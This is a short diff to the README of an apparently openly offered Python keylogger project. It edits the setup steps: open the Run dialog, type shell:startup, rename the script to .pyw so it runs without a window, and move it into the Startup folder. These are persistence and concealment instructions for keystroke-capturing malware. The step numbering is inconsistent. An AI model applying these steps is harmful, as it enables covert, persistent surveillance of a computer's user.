@@ -21,6 +21,13 @@ python keylogger.py
 ```python
 WINDOWS + R
 ```
+
+<p>2. Type </p>
+
+```python
+shell:startup
+```
+
 <p>2. Rename file from keylloger.py to keylogger.pyw </p>
 
 ```python
@@ -28,7 +35,7 @@ keylogger.pyw
 ```
 <p>3. Move keylogger.pyw to the Startup folder</p>
 
-type shell:startup
+
 
 # Contributing
 
